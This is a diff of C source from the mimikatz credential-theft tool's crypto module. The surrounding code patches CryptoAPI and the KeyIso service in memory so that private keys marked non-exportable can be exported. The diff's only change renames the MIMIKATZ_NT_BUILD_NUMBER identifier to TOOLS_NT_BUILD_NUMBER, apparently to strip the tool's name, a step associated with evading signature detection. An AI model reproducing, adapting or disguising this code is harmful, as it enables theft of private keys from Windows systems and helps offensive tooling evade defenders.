@@ -67,8 +67,8 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 	KULL_M_MEMORY_SEARCH sMemoryRSA = {{{K_RSA_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL}, sMemoryDSS = {{{K_DSS_CPExportKey, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, 0}, NULL};
 	PKULL_M_PATCH_GENERIC currentReference4001, currentReference4000, currentReference104;
 	
-	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), MIMIKATZ_NT_BUILD_NUMBER);
-	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), MIMIKATZ_NT_BUILD_NUMBER);
+	currentReference4001 = kull_m_patch_getGenericFromBuild(Capi4001References, ARRAYSIZE(Capi4001References), TOOLS_NT_BUILD_NUMBER);
+	currentReference4000 = kull_m_patch_getGenericFromBuild(Capi4000References, ARRAYSIZE(Capi4000References), TOOLS_NT_BUILD_NUMBER);
 	if(currentReference4001 && currentReference4000)
 	{
 		aPattern4001Memory.address = currentReference4001->Search.Pattern;
@@ -85,7 +85,7 @@ NTSTATUS kuhl_m_crypto_p_capi(int argc, wchar_t * argv[])
 		}
 		else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName(RSA)");
 	}
-	currentReference104 = kull_m_patch_getGenericFromBuild(CapiDSS104References, ARRAYSIZE(CapiDSS104References), MIMIKATZ_NT_BUILD_NUMBER);
+	currentReference104 = kull_m_patch_getGenericFromBuild(CapiDSS104References, ARRAYSIZE(CapiDSS104References), TOOLS_NT_BUILD_NUMBER);
 	if(currentReference104)
 	{
 		aPattern104Memory.address = currentReference104->Search.Pattern;
@@ -154,7 +154,7 @@ NTSTATUS kuhl_m_crypto_p_cng(int argc, wchar_t * argv[])
 		if(NT_SUCCESS(NCryptOpenStorageProvider(&hProvider, NULL, 0)))
 		{
 			NCryptFreeObject(hProvider);
-			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
+			kull_m_patch_genericProcessOrServiceFromBuild(CngReferences, ARRAYSIZE(CngReferences), L"KeyIso", (TOOLS_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"ncrypt.dll" : L"ncryptprov.dll", TRUE);
 		}
 	}
 	__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
